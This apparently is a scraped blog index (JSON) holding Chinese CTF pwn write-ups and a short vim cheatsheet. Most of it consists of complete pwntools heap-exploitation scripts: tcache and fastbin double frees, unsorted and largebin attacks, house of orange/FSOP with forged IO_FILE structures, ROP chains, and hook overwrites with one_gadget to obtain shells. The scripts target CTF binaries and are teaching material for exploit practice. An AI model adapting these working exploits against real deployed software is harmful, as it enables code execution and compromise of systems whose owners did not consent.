env=&#123;\"LD_PRELOAD\":\"/home/wood/pwn/glibc-all-in-one/libs/2.29-0ubuntu2_amd64/libc-2.29.so\"&#125;) libc = ELF('/home/wood/pwn/glibc-all-in-one/libs/2.29-0ubuntu2_amd64/libc-2.29.so') context.terminal = ['tmux', 'splitw', '-h'] gdb.attach(sh) def add(name,content): sh.recvuntil(\"Give me your choice : \\n\") sh.sendline('1') sh.recvuntil('input name\\n') sh.send(name) sh.recvuntil('input sex\\n') sh.sendline('W') sh.recvuntil(\"input information\\n\") sh.send(content) def remove(idx): sh.recvuntil(\"Give me your choice : \\n\") sh.sendline('4') sh.recvuntil(\"Give me your index : \\n\") sh.sendline(str(idx)) def edit(idx,content): sh.recvuntil(\"Give me your choice : \\n\") sh.sendline('3') sh.recvuntil(\"Give me your index : \\n\") sh.sendline(str(idx)) sh.recvuntil(\"Are you sure change sex?\\n\") sh.sendline('Y') sh.recvuntil(\"Now change information\\n\") sh.send(content) def show(idx): sh.recvuntil(\"Give me your choice : \\n\") sh.sendline('2') sh.recvuntil(\"Give me your index : \\n\") sh.sendline(str(idx)) add('a'*8,'a'*0x70) add('b'*8,'b'*0x70) add('c'*8,'c'*0x70) add('d'*8,'d'*0x70) remove(3) edit(3,'1'*0x70) remove(3) remove(2) edit(2,'2'*0x70) remove(2) remove(1) edit(1,'1'*0x70) remove(0) edit(0,'1'*0x70) remove(0) remove(1) show(1) libc_base = u64(sh.recv(6).ljust(8,'\\x00')) - 0x1e4ca0 log.success(\"libc_base: \" + hex(libc_base)) system_addr = libc_base + 0x52fd0 free_hook = libc_base + libc.sym['__free_hook'] log.success('free_hook: '+hex( free_hook)) log.success('system: ' + hex(system_addr)) add(p64(free_hook),p64(free_hook)*14) add('/bin/sh\\x00','/bin/sh\\x00'*14) add(p64(system_addr),p64(system_addr)*14) remove(5) #show(5) sh.interactive()","tags":[{"name":"tcache","slug":"tcache","permalink":"wood1314.github.io/tags/tcache/"},{"name":"double","slug":"double","permalink":"wood1314.github.io/tags/double/"}]},{"title":"自己常用的vim操作","date":"2020-02-23T10:11:47.000Z","path":"year/02/23/cl6ewldbl0063j63fzu3unzu4/","text":"备忘 首先就是自己直接用了github上的配置https://github.com/amix/vimrc 打开命令vim -O fileA fileB 分屏打开 正常模式a 向后插入o 在下一行插入u 撤销$ 将光标移动到行尾gg 跳转到开头G 跳转到结尾ctrl d 向下移动半屏ctrl u 向上移动半屏 插件使用f3 树状结构Ctrl f 查找文件Ctrl v 分屏打开 gt 切换tab","tags":[{"name":"vim","slug":"vim","permalink":"wood1314.github.io/tags/vim/"}]},{"title":"近期杂七杂八的刷题","date":"2020-02-20T00:41:33.000Z","path":"year/02/20/cl6ewldbr006gj63f2r2216yk/","text":"0x00 前言就是最近刷的一些简单题 ZeroStrage这道题就是有一个uaf，然后利用unsortedbin attack 改掉global_fast_max, 再用释放一个chunk使其覆盖IO_list_all 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124from pwn import *context.log_level = 'debug'sh = process('./zerostorage')def insert(size,content): sh.recvuntil(\"Your choice: \") sh.sendline('1') sh.recvuntil(\"Length of new entry: \") sh.sendline(str(size)) sh.recvuntil(\"Enter your data: \") sh.send(content)def update(idx,length,data): sh.recvuntil(\"Your choice: \") sh.sendline('2') sh.recvuntil(\"Entry ID: \") sh.sendline(str(idx)) sh.recvuntil(\"Length of entry: \") sh.sendline(str(length)) sh.recvuntil(\"Enter your data: \") sh.send(data)def merge(idx1, idx2): sh.recvuntil(\"Your choice: \") sh.sendline('3') sh.recvuntil(\"Merge from Entry ID: \") sh.sendline(str(idx1)) sh.recvuntil(\"Merge to Entry ID: \") sh.sendline(str(idx2))def delete(idx): sh.recvuntil(\"Your choice: \") sh.sendline('4') sh.recvuntil(\"Entry ID: \") sh.sendline(str(idx))def view(idx): sh.recvuntil(\"Your choice: \") sh.sendline('5') sh.recvuntil(\"Entry ID: \") sh.sendline(str(idx))def build_fake_file(addr,vtable): flag=0xfbad2887 #flag&amp;=~4 #flag|=0x800 fake_file=p64(flag) #_flags fake_file+=p64(addr) #_IO_read_ptr fake_file+=p64(addr) #_IO_read_end fake_file+=p64(addr) #_IO_read_base fake_file+=p64(addr) #_IO_write_base fake_file+=p64(addr+1) #_IO_write_ptr fake_file+=p64(addr) #_IO_write_end fake_file+=p64(addr) #_IO_buf_base fake_file+=p64(0) #_IO_buf_end fake_file+=p64(0) #_IO_save_base fake_file+=p64(0) #_IO_backup_base fake_file+=p64(0) #_IO_save_end fake_file+=p64(0) #_markers fake_file+=p64(0) #chain could be a anathor file struct fake_file+=p32(1) #_fileno fake_file+=p32(0) #_flags2 fake_file+=p64(0xffffffffffffffff) #_old_offset fake_file+=p16(0) #_cur_column fake_file+=p8(0) #_vtable_offset fake_file+=p8(0x10) #_shortbuf fake_file+=p32(0) fake_file+=p64(0) #_lock fake_file+=p64(0xffffffffffffffff) #_offset fake_file+=p64(0) #_codecvt fake_file+=p64(0) #_wide_data fake_file+=p64(0) #_freeres_list fake_file+=p64(0) #_freeres_buf fake_file+=p64(0) #__pad5 fake_file+=p32(0xffffffff) #_mode fake_file+=p32(0) #unused2 fake_file+=p64(0)*2 #unused2 fake_file+=p64(vtable) #vtable return fake_file#gdb.attach(sh)insert(0x20,'a'*0x20) #0insert(0x20,'a'*0x20) #1insert(0x20,'a'*0x20) #2insert(0x20,'a'*0x20) #3merge(0,0) #4 -0delete(2)#-2view(4)sh.recvuntil(\"Entry No.4:\\n\")libc_addr = u64(sh.recv(8)) - 0x3c4b78heap_addr = u64(sh.recv(8)) - 0x120global_max_fast = libc_addr + 0x3c67f8one_gadget = libc_addr + 0x4526alog.success(\"libc_addr: \"+ hex(libc_addr))log.success(\"heap_addr: \" + hex(heap_addr))log.success(\"global_max_fast: \" + hex(global_max_fast))insert(0x50,'a'*0x50)#0insert(0x20,'a'*0x20)#2# delete(0)#-0payload = p64(0) + p64(global_max_fast-0x10) + 'a'*0x10# update(4,0x20,payload)# insert(0x20,'a'*0x20)#0insert(0x1000,'a'*0x1000)#5insert(0x400,0x400*'a')#6fake_file = build_fake_file(0,heap_addr+0x10)update(5,0x1000,fake_file[0x10:].ljust(0x1000,'a'))merge(6,5)#7insert(0x1000,'a'*0x1000)#5insert(0x1000,'a'*0x1000)#6merge(2,2)#8update(8,0x20,payload)insert(0x20,'a'*0x20)#2delete(7) #-7update(0,0x50,p64(one_gadget)*(0x50/8))sh.recvuntil(\"Your choice: \")sh.sendline('7')sh.interactive() Hgame week4这道题关闭了标准输出流，利用unlink的任意地址写覆盖stdin的后四位为stderr造成泄露 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859from pwn import *sh = process('./AN2')context.log_level = 'debug'#gdb.attach(sh)sh.recvuntil(\"Welcome to Annevi's note2\\n\")def add(size,content): sh.sendline('1') sh.sendline(str(size)) sh.send(content)def dele(idx): sh.sendline('2') sh.sendline(str(idx))def show(idx): sh.sendline('3') sh.sendline(str(idx))def edit(idx,content): sh.sendline('4') sh.sendline(str(idx)) sh.send(content)buf = 0x6020E0add(0x90,'a\\n')#0add(0x90,'a\\n')#1add(0x90,'a\\n')#2add(0x90,'a\\n')#3payload = ''payload += p64(0) + p64(0x91)payload += p64(buf-0x18) + p64(buf-0x10)payload += 'a'*0x70payload += p64(0x90) + p64(0xa0)edit(0,payload+'\\n')dele(1)payload = ''payload += 'a'*0x18 + p64(0x6020A0)+p64(0x6020E0)edit(0,payload+'\\n')edit(0,'\\x40\\x25'+'\\n')show(0)sh.recvuntil('content:')libc_base = u64(sh.recv(6)+'\\x00\\x00') - 0x3c5540log.success(\"libc_base: \"+ hex(libc_base))malloc_hook = libc_base + 0x3c4b10one_gadget = libc_base + 0xf1147edit(1,p64(malloc_hook)+'\\n')edit(0,p64(one_gadget)+'\\n')sh.sendline('1')sh.sendline(str(0x90))sh.interactive() 2019国赛 daily这道的漏洞点在于free的时候没有对index进行限制，于是可以任意地址free，然后伪造chunk进行对重叠 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182from pwn import *sh = process('./daily')context.log_level = 'debug'gdb.attach(sh)ptr = 0x602060def Show(): sh.recvuntil(\"choice:\") sh.sendline('1')def Add(length, content): sh.recvuntil(\"choice:\") sh.sendline('2') sh.recvuntil(':') sh.sendline(str(length)) sh.recvuntil('daily\\n') sh.send(content)def Change(idx, content): sh.recvuntil(\"choice:\") sh.sendline('3') sh.recvuntil(':') sh.sendline(str(idx)) sh.recvuntil('daily\\n') sh.send(content)def Remove(idx): sh.recvuntil(\"choice:\") sh.sendline('4') sh.recvuntil(':') sh.sendline(str(idx))Add(0x400,'a') #0Add(0x20,'a') #1Remove(0)Add(0x20,'a') #0Show()sh.recv(4)libc_base = u64(sh.recv(6).ljust(8,'\\x00')) - 0x3c4f61log.success('libc_base: ' + hex(libc_base))Change(0,'a'*0x11)Show()sh.recvuntil('a'*0x10)heap_base = u64(sh.recv(4).ljust(8,'\\x00')) - 0x61log.success('heap_base: ' + hex(heap_base))fake_chunk1 = heap_base + 0x70payload = ''payload += 0x20 * 'a'payload += p64(0)payload += p64(0x61)payload += 'a'*0x8payload += p64(fake_chunk1)payload += 'a'*0x40payload += p64(0)payload += p64(0x21)Add(0x300,payload) #2Add(0x60,'a\\n')#3fake_idx1 = (heap_base+0x78- 0x602068)/0x10print hex(fake_idx1)Remove(fake_idx1)onegadget = libc_base + 0x4526amalloc_hook = 0x3c4b10 + libc_base - 0x23free_hook = libc_base + 0x3c67a8payload = ''payload += 0x20 * 'a'payload += p64(0)payload += p64(0x61)payload += p64(ptr+0x30 - 0x8)Change(2,payload)Add(0x50,'a\\n')Add(0x50, p64(free_hook))Change(3,p64(onegadget))Remove(4)sh.interactive() 2019国赛double这道题就很简单了，就是个uaf 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455from pwn import *sh = process('./pwn')context.log_level = 'debug'gdb.attach(sh)def add(data): sh.recvuntil(\"&gt; \") sh.sendline('1') sh.recvuntil(\":\\n\") sh.send(data)def show(idx): sh.recvuntil(\"&gt; \") sh.sendline('2') sh.recvuntil(\": \") sh.sendline(str(idx))def eidt(idx,data): sh.recvuntil(\"&gt; \") sh.sendline('3') sh.recvuntil(\": \") sh.sendline(str(idx)) sh.send(data)def delete(idx): sh.recvuntil(\"&gt; \") sh.sendline('4') sh.recvuntil(\": \") sh.sendline(str(idx))add(0x8f*'a'+'\\n') #0add(0x8f*'a'+'\\n') #1add(0x1f*'a'+'\\n') #2delete(0)show(1)libc_base = u64(sh.recvuntil(\"\\n\")[:-1].ljust(8,'\\x00')) - 0x3c4b78malloc_hook = libc_base + 0x3c4b10one_gad = libc_base + 0x4526alog.success(\"libc_base: \" + hex(libc_base))log.success(\"malloc_hook: \" + hex(malloc_hook))add(0x5f*'a'+'\\n') #3add(0x5f*'a'+'\\n') #4add(0x1f*'a'+'\\n') #5delete(3)eidt(4,p64(malloc_hook-0x23)+'\\n')add('b'*0x5f + '\\n')#6payload = ''payload += 'a'*0x13payload += p64(one_gad)payload = payload.ljust(0x5f,'c')add(payload + '\\n')#7sh.recvuntil(\"&gt; \")sh.sendline('1')sh.interactive() hctf2016这道题就是通过堆上的操作可以拿到控制流，然后再在栈上构造rop链 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293from pwn import *context.log_level = 'debug' sh = process('./pwn')#gdb.attach(sh)elf = ELF('./pwn')def Create(size,content): sh.recvuntil(\"3.quit\\n\") sh.sendline(\"create \") sh.recvuntil(\"Pls give string size:\") sh.sendline(str(size)) sh.recvuntil('str:') sh.send(content)def Delete(idx): sh.recvuntil(\"3.quit\\n\") sh.sendline(\"delete \") sh.recvuntil(\"Pls give me the string id you want to delete\\nid:\") sh.sendline(str(idx)) sh.recvuntil(\"Are you sure?:\") sh.sendline('yes')#直接改后三位为puts泄露pie基地址Create(4,'a'*4+'\\x00') #0Create(4,'b'*4+'\\x00') #1Delete(1)Delete(0)payload = 0x18*'a'payload += '\\x0b'Create(0x20,payload+'\\x00') Delete(1)sh.recvuntil(0x18*'a')text_addr = u64(sh.recvuntil(\"\\n\")[:-1].ljust(8,'\\x00')) - 0xd0blog.success(\"text_addr: \" + hex(text_addr))pop_rdi = text_addr + 0x11d3puts_plt = text_addr + elf.plt['puts']atoi_got = text_addr + elf.got['atoi']main_addr = text_addr + 0xBCA#把那个函数指针pop_pop_pop_pop_ret，然后在输入yes的那个地方其实在栈上输入挺多的，可以构造rop链#泄露libc地址Create(4,'a'*4+'\\x00') #1Create(4,'b'*4+'\\x00') #2Delete(2)Delete(1)ropchain = 0x18*'a'ropchain += p64(text_addr + 0x11cc)Create(0x21,ropchain+'\\x00') payload = 'yes ' + 'a'*4payload += p64(pop_rdi)payload += p64(atoi_got)payload += p64(puts_plt)payload += p64(main_addr)sh.recvuntil(\"3.quit\\n\")sh.sendline(\"delete \")sh.recvuntil(\"Pls give me the string id you want to delete\\nid:\")sh.sendline(str(2))sh.recvuntil(\"Are you sure?:\")sh.sendline(payload)libc_addr = u64(sh.recvuntil(\"\\n\")[:-1].ljust(8,'\\x00')) - 0x36e80log.success('libc_addr: '+ hex(libc_addr))#再次构造rop链拿到shellCreate(4,'a'*4+'\\x00') #1Create(4,'b'*4+'\\x00') #2Delete(3)Delete(2)ropchain = 0x18*'a'ropchain += p64(text_addr + 0x11cc)Create(0x21,ropchain+'\\x00') system_addr = libc_addr + 0x45390binsh_addr = libc_addr + 0x18cd57payload = 'yes ' + 'a'*4payload += p64(pop_rdi)payload += p64(binsh_addr)payload += p64(system_addr)sh.recvuntil(\"3.quit\\n\")sh.sendline(\"delete \")sh.recvuntil(\"Pls give me the string id you want to delete\\nid:\")sh.sendline('3')sh.recvuntil(\"Are you sure?:\")sh.sendline(payload)sh.interactive()##一些有用的gdb调试命令## heapinfo## tracemalloc on starctf 2019 heap_master123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158from pwn import *context.update(os=\"linux\",arch=\"amd64\")#context.log_level = \"debug\"context.aslr = Falselibc = ELF('./libc-2.23.so')def add(size): p.recvuntil(\"&gt;&gt; \") p.sendline('1') p.recvuntil(\"size: \") p.sendline(str(size))def edit(idx,data): p.recvuntil(\"&gt;&gt; \") p.sendline('2') p.recvuntil(\"offset: \") p.sendline(str(idx)) p.recvuntil(\"size: \") p.sendline(str(len(data))) p.recvuntil(\"content: \") p.send(data)def delete(idx): p.recvuntil(\"&gt;&gt; \") p.sendline('3') p.recvuntil(\"offset: \") p.sendline(str(idx))def g(offset): return libc_address + offsetoffset = 0x8060stdout = 0x5620#p = remote('node3.buuoj.cn',27255)p = process('./starctf_2019_heap_master', env=&#123;\"LD_PRELOAD\":\"./libc-2.23.so\"&#125;)##chunk:0x330 0x30edit(offset+0x8,p64(0x331)) #1edit(offset+0x8+0x330,p64(0x31))##chunk 0x410 0x30edit(offset+0x8+0x360,p64(0x411)) #2edit(offset+0x8+0x360+0x410,p64(0x31))##chunk 0x410 0x30 0x30edit(offset+0x8+0x360+0x440,p64(0x411)) #3edit(offset+0x8+0x360+0x440+0x410,p64(0x31))edit(offset+0x8+0x360+0x440+0x440,p64(0x31))##unsorted bin:0x410(2)-&gt;0x330(1)delete(offset+0x10) #1 0x330delete(offset+0x10+0x360) #2 0x410##unsorted bin:0x330-0xa0=0x290##largebin:0x410 chunk 2add(0x90) #0xa0##edit size + fd + bkedit(offset+0x8+0x360,p64(0x101)*3) #2 size+fd+bkedit(offset+0x8+0x460,p64(0x101)*3) #chunk 2 + 0x100edit(offset+0x8+0x560,p64(0x101)*3) #chunk 2 + 0x200##unsorted bin:0x60(chunk 2-0xa0)##smallbin:0x60(chunk 2+0x10-0xa0)##smallbin:0x290##largebin:chunk 2delete(offset+0x10+0x370) #0x100 free (chunk 2+0x10)add(0x90) #(chunk 2 + 0x10)-0xa0delete(offset+0x10+0x360) #0x100 free (chunk 2)add(0x90) #chunk 2-0xa0#gdb.attach(p)##largebin attack##fwd-&gt;bk = stdout - 0x10##fwd-&gt;bk_next_size = stdout+0x19-0x20##stdout-&gt;victim##stdout+0x19-&gt;victim##(flag &amp; 0xa00) and (flag &amp; 0x1000 == 1) and (flag)##_IO_write_base(stdout+0x20) partial write 0x00edit(offset+0x8+0x360,p64(0x3f1)+p64(0)+p16(stdout-0x10)) #chunk 2-&gt;bkedit(offset+0x8+0x360+0x18,p64(0)+p16(stdout+0x19-0x20)) #chunk 2-&gt;bk_nextsizedelete(offset+0x10+0x360+0x440) #free chunk 3(0x410)add(0x90)one = [0x45216, 0x4526a, 0xf02a4, 0xf1147]p.recvn(0x18)leak_addr = u64(p.recvn(8).ljust(8,'\\x00'))libc_address = leak_addr - 0x3c36e0heap_base = u64(p.recvn(8)) - 0x880log.success('lead_addr: ' + hex(leak_addr))log.success('libc_base: ' + hex(libc_address))log.success('heap_base: ' + hex(heap_base))offset = 0x100edit(offset+0x8,p64(0x331)) #1edit(offset+0x8+0x330,p64(0x31))edit(offset+0x8+0x360,p64(0x511)) #2edit(offset+0x8+0x360+0x510,p64(0x31))edit(offset+0x8+0x360+0x540,p64(0x511)) #3edit(offset+0x8+0x360+0x540+0x510,p64(0x31))edit(offset+0x8+0x360+0x540+0x540,p64(0x31))delete(offset+0x10) #1 0x330delete(offset+0x10+0x360) #2 0x510add(0x90)##edit chunk 2 0x4f0##fwd-&gt;bk = io_list_all - 0x10##ffwd-&gt;bk_nextsize = io_list_all - 0x20edit(offset+0x8+0x360,p64(0x4f1)+p64(0)+p64(libc.symbols[\"_IO_list_all\"]-0x10))edit(offset+0x8+0x360+0x18,p64(0)+p64(libc.symbols[\"_IO_list_all\"]-0x20))##unsorted bin:0x510##smallbin:0x330##largebin:0x3f0 0x4f0##io_list_all -&gt; victim (chunk 3 0x510)delete(offset+0x10+0x360+0x540) #3 0x510add(0x200)_IO_str_jump = p64(libc_address + (0x7ffff7dd07a0-0x00007ffff7a0d000))#pp_j = g(0x12d80d) #pop rbx;pop rbp;jmp rdxpp_j = g(one[1])p_rsp_r = g(0x03838) #pop rsp;retp_rsp_r13_r = g(0x206d3) #pop rsp;pop r13;retp_rdi_r = g(0x21112) #pop rdi;retp_rdx_rsi_r = g(0x115189) #pop rdx;pop rsi;refake_IO_strfile = p64(0) + p64(p_rsp_r)fake_IO_strfile += p64(heap_base+8) + p64(0)fake_IO_strfile += p64(0) + p64(p_rsp_r13_r)##rbx=rdi-&gt;fake IO_list_all(offset+0x360+0x540)##mov rdx,[rdi+0x28] -&gt; p_rsp_r13_r##call QWORD PTR [rbx+0xe0] - &gt; call [offset+0x360+0x540+0xe0] -&gt; pp_j##pp_j -&gt; jmp rdx -&gt; p_rsp_r13_rfake_IO_strfile = p64(0) + p64(p_rsp_r)fake_IO_strfile += p64(heap_base+8) + p64(0)fake_IO_strfile += p64(0) + p64(p_rsp_r13_r)orw = [ p_rdi_r,heap_base, p_rdx_rsi_r, 0, 0, libc.symbols[\"open\"], p_rdi_r, 3, p_rdx_rsi_r, 0x100, heap_base+0x1337, libc.symbols[\"read\"], p_rdi_r, 1, p_rdx_rsi_r, 0x100, heap_base+0x1337, libc.symbols[\"write\"],]edit(0,'./flag\\x00\\x00'+flat(orw))edit(offset+0x360+0x540,fake_IO_strfile)##io_list_all+0xd8:vtableedit(offset+0x360+0x540+0xd8,_IO_str_jump)edit(offset+0x360+0x540+0xe0,p64(pp_j))#gdb.attach(p)p.sendlineafter(\"&gt;&gt; \",'0')p.sendlineafter(\"&gt;&gt; \",'0')p.interactive() baby堆风水没看出来有什么特别的，就挺简单的一个堆溢出，然后用got泄露，修改free_got然后直接打就可以了 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879#coding=utf-8from pwn import *from sys import argvif len(argv)==3: ip,port=argv[1],int(argv[2]) io=remote(ip,port)else: io=process('./pwn')e = ELF(\"./pwn\")libc = ELF(\"libc-2.23.so\")#context.log_level = \"debug\"#context.terminal = [\"/usr/bin/tmux\", \"splitw\", \"-h\", \"-p\", \"70\"]def debug(): gdb.attach(io)def add_user(description_size, name, text_len, text): io.recvuntil(\"Action: \") io.sendline(\"0\") io.recvuntil(\"size of description: \") io.sendline(str(description_size)) io.recvuntil(\"name: \") io.sendline(name) io.recvuntil(\"text length: \") io.sendline(str(text_len)) io.recvuntil(\"text: \") io.sendline(text)def delete_user(index): io.recvuntil(\"Action: \") io.sendline(\"1\") io.recvuntil(\"index: \") io.sendline(str(index))def display(index): io.recvuntil(\"Action: \") io.sendline(\"2\") io.recvuntil(\"index: \") io.sendline(str(index))def update(index, text_len, text): io.recvuntil(\"Action: \") io.sendline(\"3\") io.recvuntil(\"index: \") io.sendline(str(index)) io.recvuntil(\"text length: \") io.sendline(str(text_len)) io.recvuntil(\"text: \") io.sendline(text)add_user(0x10, \"aaa\", 0x10, \"bbb\") #index0add_user(0x10, \"aaa\", 0x10, \"bbb\") #index1add_user(0x10, \"aaa\", 0x10, \"/bin/bash\\x00\") #index2delete_user(0)free_got = e.got[\"free\"]payload = 128*\"a\" + p32(0x0) + p32(0x19) + \"\\x00\"*20 + p32(0x89) + p32(free_got)add_user(0x80, \"aaa\", len(payload), payload) #index3# leak libcdisplay(1)io.recvuntil(\"description: \")free_addr = u32(io.recv(4))#libc_addr = free_addr - libc.symbols[\"free\"]libc_addr = free_addr - 0x00070750print(\"func address: \" + hex(free_addr))print(\"libc address: \" + hex(libc_addr))#get shell#system_addr = libc_addr + libc.symbols[\"system\"]system_addr = libc_addr + 0x03a940payload = p32(system_addr)update(1, len(payload), payload)delete_user(2)io.interactive()","tags":[{"name":"堆","slug":"堆","permalink":"wood1314.github.io/tags/堆/"}]},{"title":"pwnable-tw bookwriter","date":"2020-02-19T07:00:22.000Z","path":"year/02/19/cl6ewldaa0032j63fyqsa7hrd/","text":"0x00 前言主要是一道house of orange，利用方法很经典，学习了 0x01 题目分析main12345678910111213141516171819202122232425262728293031void __fastcall main(__int64 a1, char **a2, char **a3)&#123; setvbuf(stdout, 0LL, 2, 0LL); puts(\"Welcome to the BookWriter !\"); sub_400BDF(); while ( 1 ) &#123; menu(); switch ( get_num() ) &#123; case 1LL: add(); break; case 2LL: view(); break; case 3LL: edit(); break; case 4LL: info(); break; case 5LL: exit(0); return; default: puts(\"Invalid choice\"); break; &#125; &#125;&#125; 其中定义了两个int_64[8]数组在BSS段，分别存储书页的地址和书页内容大小信息，两数组在BSS段上位置相邻。 add添加的操作顺序从0到8依次搜索，判断标准是该位置是否为空，并获得一次向堆地址写的机会 12345678910111213141516171819202122232425262728int add()&#123; unsigned int i; // [rsp+Ch] [rbp-14h] char *v2; // [rsp+10h] [rbp-10h] __int64 size; // [rsp+18h] [rbp-8h] for ( i = 0; ; ++i ) &#123; if ( i &gt; 8 ) return puts(\"You can't add new page anymore!\"); if ( !qword_6020A0[i] ) break; &#125; printf(\"Size of page :\"); size = get_num(); v2 = (char *)malloc(size); if ( !v2 ) &#123; puts(\"Error !\"); exit(0); &#125; printf(\"Content :\"); my_read((__int64)v2, size); qword_6020A0[i] = v2; qword_6020E0[i] = size; ++dword_602040; return puts(\"Done !\");&#125; view利用%s输出信息，可以用来泄露libc和heap信息 12345678910111213141516int view()&#123; unsigned int v1; // [rsp+Ch] [rbp-4h] printf(\"Index of page :\"); v1 = get_num(); if ( v1 &gt; 7 ) &#123; puts(\"out of page:\"); exit(0); &#125; if ( !qword_6020A0[v1] ) return puts(\"Not found !\"); printf(\"Page #%u \\n\", v1); return printf(\"Content :\\n%s\\n\", qword_6020A0[v1]);&#125; edit编辑操作，可以输入0到7的数值，用strlen重新确定大小 123456789101112131415161718int sub_400B27()&#123; unsigned int v1; // [rsp+Ch] [rbp-4h] printf(\"Index of page :\"); v1 = get_num(); if ( v1 &gt; 7 ) &#123; puts(\"out of page:\"); exit(0); &#125; if ( !qword_6020A0[v1] ) return puts(\"Not found !\"); printf(\"Content:\"); my_read((__int64)qword_6020A0[v1], qword_6020E0[v1]); qword_6020E0[v1] = strlen(qword_6020A0[v1]); return puts(\"Done !\");&#125; info输出名称信息 123456789101112131415unsigned __int64 info()&#123; int v1; // [rsp+4h] [rbp-Ch] unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); v1 = 0; printf(\"Author : %s\\n\", &amp;unk_602060); printf(\"Page : %u\\n\", (unsigned int)dword_602040); printf(\"Do you want to change the author ? (yes:1 / no:0) \"); _isoc99_scanf(\"%d\", &amp;v1); if ( v1 == 1 ) sub_400BDF(); return __readfsqword(0x28u) ^ v2;&#125; 0x02 漏洞分析 首先注意到name所在bss段位置与存储heap信息的bss段相邻，因此可以用info泄露heap地址 eidt的时候是用strlen重新计算size的，因此两次edit后可以覆盖到下一个堆块的size位置 add的时候多add了一个，应该是0到7就可以。利用的话就是堆地址会写到heap_page[0]的size位置，这样就可以造成很长的堆溢出 0x03 漏洞利用整个程序都没有出现free，house of orange的典型利用场景。 利用条件 泄露heap，libc地址 堆溢出 libc2.23 及以下版本 泄露信息（libc地址）因为程序中有堆的越界写，可以修改top_chunk的大小。在malloc源码里面如果申请的堆块大小超过了top_chunk的大小，将调用sysmalloc来进行分配。sysmalloc里面针对这种情况有两种处理，一种是直接mmap出来一块内存，另一种是扩展top_chunk 1234567891011/* If have mmap, and the request size meets the mmap threshold, and the system supports mmap, and there are few enough currently allocated mmapped regions, try to directly map this request rather than expanding top. */if ((unsigned long) (nb) &gt;= (unsigned long) (mp_.mmap_threshold) &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)) &#123; char *mm; /* return value from mmap call*/ try_mmap: 就是如果申请大小&gt;=mp_.mmap_threshold,就会mmap。我们质只要申请不要过大，一般不会触发这个，这个mmap_threshold的值为128*1024。不过下面还有两个assert需要检查，如下 123456789101112131415161718old_top = av-&gt;top;old_size = chunksize (old_top);old_end = (char *) (chunk_at_offset (old_top, old_size)); brk = snd_brk = (char *) (MORECORE_FAILURE); /* If not the first time through, we require old_size to be at least MINSIZE and to have prev_inuse set. */ assert ((old_top == initial_top (av) &amp;&amp; old_size == 0) || ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp; prev_inuse (old_top) &amp;&amp; ((unsigned long) old_end &amp; pagemask) == 0)); /* Precondition: not enough current space to satisfy nb request */assert ((unsigned long) (old_size) &lt; (unsigned long) (nb + MINSIZE)); 第一个assert就是要求修改后的top_chunk_size必须满足 top_chunk的size必须大于MINSIZE top_chunk的pre_inuse位必须为1 让top_chunk满足页对齐，一般就是后三位都为0 top_chunk的size小于申请的大小 满足以上四个条件之后，继续往下执行最后把原先的那个old_top给释放掉了，进入unsortedbin中 这样的话我们再次申请一个堆块分配到这块区域中就能泄露libc地址了 劫持控制流我们知道有rop即retn Oriented Programming，那么其实File Stream Oriented Programming是一个道理的。也是一种劫持程序流程的方法，只不过方式是通过攻击File Stream来实现罢了。我们先要了解malloc对错误信息的处理过程,malloc_printerr是malloc中用来打印错误的函数。 malloc_printerr其实是调用__libc_message函数之后调用abort函数，abort函数其中调用了_IO_flush_all_lockp，这里面用到IO_FILE_ALL里面的结构，采用的是虚表调用的方式。 这里也学到一个操作，调试这里的时候可以直接b _IO_flush_all_lockp来断到这个函数，然后看自己的fsop是不是成功了,也可以直接用fsop这个命令。最后看第二个fp是不是unsortedbin的地址，还有就是Func是不是自己想要跳转的函数 其中使用到了IO_FILE对象中的虚表，如果我们能够修改IO_FILE的内容那么就可以一定程度上劫持流程。IO_FILE_ALL是一个指向IO_FILE_plus的结构指针，结构如下图所示，具体结构不需要太了解清晰，大概懂一些也就行。 那么怎么劫持呢，这里又需要用到unsortbin attack的知识。unsortbin attack是怎么一回事呢，其实就是在malloc的过程中，unsortbin会从链表上卸下来（只要分配的大小不是fastchunk大小）,只要我们能控制unsortedbin的bk内容，在unlink的时候就会把unsortedbin的地址写入bk+0x10的位置 这样我们把_IO_list_all的地址改成main_arena,但是main_aren上的内容我们也不是完全可控的，于是就是这个利用很精妙的地方，让其通过chain跳转到我们能自己控制内容的地方即伪造的FILE结构 这里还是要牵扯到io_file的使用，IO_FILE结构中有一个字段是chian字段，它位于0x60偏移处,他指向的是下一个IO_FILE结构体，我们如果可以控制这个字段，就再次指定io_file的位置，它相当于是一个链表的结构这样的话又联系到smallchunk的问题，在拆卸unsort_bin时候对属于small_bin的chunk进行了记录操作。 这个时候IO_FILE_all指向的正是main_arena的bins里面unsortbin的位置，那么偏移0x60处正好是，smallchunk的index为6的地方，也就是满足大小为16*6的chunk，所以upgrade时候需要把unsortbin设置为0x60大小。 12345678910111213while (fp != NULL)&#123;… fp = fp-&gt;_chain; ... if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T || (_IO_vtable_offset (fp) == 0 &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base))#endif ) &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF) 下一步就是在原top内伪造_IO_file_plus结构体，满足 fp-&gt;mode&gt;=0 _IO_vtable_offset (fp) ==0 fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base 